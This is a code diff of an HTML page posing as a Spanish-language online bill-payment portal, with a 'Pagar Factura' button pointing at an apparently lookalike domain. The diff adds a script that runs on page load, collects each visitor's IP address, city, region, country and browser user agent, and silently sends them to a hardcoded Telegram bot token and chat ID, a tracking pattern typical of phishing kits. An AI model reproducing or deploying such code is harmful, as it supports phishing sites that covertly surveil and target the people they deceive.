@@ -95,10 +95,23 @@
     <p>Bienvenido al portal de pagos en línea caribe <strong></strong></p>
     <a href="https://caribesolpagos.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9" class="btn-pagar">Pagar Factura</a>
   </div>
-  <script>
-  window.onload = function () {
-    fetch("send-message.php");
-  };
+<script>
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const city = data.city;
+      const region = data.region;
+      const country = data.country_name;
+      const userAgent = navigator.userAgent;
+
+      const message = `👀 Visita detectada\nIP: ${ip}\nCiudad: ${city}\nRegión: ${region}\nPaís: ${country}\nUser Agent: ${userAgent}`;
+
+      fetch(`https://api.telegram.org/bot7786625902:AAHc0n-r3nq0_IX7dpibp-io431roMmo3KE/sendMessage?chat_id=-1002425722535&text=${encodeURIComponent(message)}`)
+      .catch(console.error);
+    })
+    .catch(err => console.error('Error obteniendo IP:', err));
 </script>
+
 </body>
 </html>
